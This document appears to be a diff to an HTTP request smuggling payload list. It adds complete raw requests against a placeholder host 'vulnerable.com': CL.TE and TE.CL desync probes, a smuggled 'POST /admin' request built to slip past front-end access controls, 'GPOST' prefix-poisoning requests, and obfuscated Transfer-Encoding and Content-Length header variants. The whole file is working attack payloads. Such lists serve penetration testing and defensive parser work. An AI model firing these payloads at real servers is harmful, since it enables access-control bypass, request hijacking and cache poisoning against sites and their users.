@@ -1,37 +1,85 @@
-Transfer-Encoding: chunked
-Transfer-Encoding : chunked
-Transfer-Encoding: xchunked
-Transfer-Encoding: chunked\r\n
-Transfer-Encoding:\tchunked
-X-Transfer-Encoding: chunked
-Transfer-Encoding: chunk
-TE: chunked
-TE: trailers
-
 POST / HTTP/1.1
-Host: target.com
-Content-Length: 13
 Transfer-Encoding: chunked
+Content-Length: 6
 
 0
 
-SMUGGLED
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+0
 
 POST / HTTP/1.1
-Host: target.com
-Content-Length: 3
+Host: vulnerable.com
+Content-Length: 13
 Transfer-Encoding: chunked
 
-8
-SMUGGLED
+b
+smuggled=1
+0
+
+POST /search HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable.com
+Content-Length: 116
+Transfer-Encoding: chunked
+
+86
+POST /admin HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+0
+
+POST / HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+12
+GPOST / HTTP/1.1
+
 0
 
 Transfer-Encoding: xchunked
 Transfer-Encoding : chunked
 Transfer-Encoding: chunked
 Transfer-Encoding: x
-Transfer-Encoding: [tab]chunked
-[space]: chunked
-X: X[\n]Transfer-Encoding: chunked
-Transfer-Encoding
-: chunked
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[
+]Transfer-Encoding: chunked
+Content-Length: 0
+Content-Length: 00
+Content-Length: 0x0
+Content-Length: 0 (space)
+Content-Length:0
+Content-Length : 0
